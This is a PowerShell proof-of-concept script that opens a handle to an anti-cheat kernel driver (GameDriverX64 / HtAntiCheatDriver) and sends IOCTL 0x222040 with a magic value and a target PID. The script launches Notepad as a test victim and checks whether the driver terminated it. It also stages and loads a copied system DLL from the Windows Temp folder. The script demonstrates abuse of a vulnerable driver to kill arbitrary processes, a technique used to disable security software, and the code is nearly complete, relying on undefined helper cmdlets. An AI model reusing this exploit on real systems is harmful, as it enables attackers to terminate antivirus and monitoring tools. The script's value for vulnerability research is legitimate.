Clear-Host
Write-Host

try {
  try {
    if (-not [System.IO.File]::Exists('C:\Windows\Temp\QmGUI.dll')) {
      $DllData = [System.IO.File]::ReadAllBytes('C:\Windows\System32\version.dll')
      [System.IO.File]::WriteAllBytes('C:\Windows\Temp\QmGUI.dll', $DllData)
    }
    Ldr-LoadDll -dwFlags ALTERED_SEARCH -dll 'C:\Windows\Temp\QmGUI.dll' | Out-Null
  } catch {}
  
  Write-Host "Starting target process (Notepad)..." -ForegroundColor Cyan
  $PROC = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru
  $PROCID = $PROC.Id
  Write-Host "Notepad started with PID: $PROCID" -ForegroundColor Green

  Write-Host "Opening handle to driver device..." -ForegroundColor Cyan
  $hDevice = Get-FileHandle -FileName GameDriverX64 -AlternativeName HtAntiCheatDriver -Symbolic 'Device'
  Write-Host "Driver handle acquired successfully." -ForegroundColor Green

  Write-Host "Preparing buffer with PID ($PROCID) and sending IOCTL 0x222040..." -ForegroundColor Cyan
  $inOutPtr = New-IntPtr -Size 8 -TypeSize ([Int32], [Int32]) -Values (0xFA123456, $PROCID)
    
  $ioctlResult = Invoke-IoctlCall -Mode 0 -FileHandle $hDevice -IoCtrlCode 0x222040 -InOutPtr $inOutPtr -InputSize 8 -OutputSize 0
  Write-Host "IOCTL call completed. Output/Result: $ioctlResult" -ForegroundColor Green

  # Brief pause to allow the driver to process the request
  Start-Sleep -Milliseconds 500

  $PROC.Refresh()
  Write-Host "Checking process status..." -ForegroundColor Cyan
  if ($PROC.HasExited) {
      Write-Host "Target process (PID $PROCID) was terminated or affected by the driver." -ForegroundColor Yellow
  } else {
      Write-Host "Target process (PID $PROCID) is still running normally." -ForegroundColor Green
      # Cleanup: close the test instance of Notepad if it's still alive
      $PROC.Kill()
  }
}
finally {
  Free-IntPtr $hDevice -Method NtHandle
}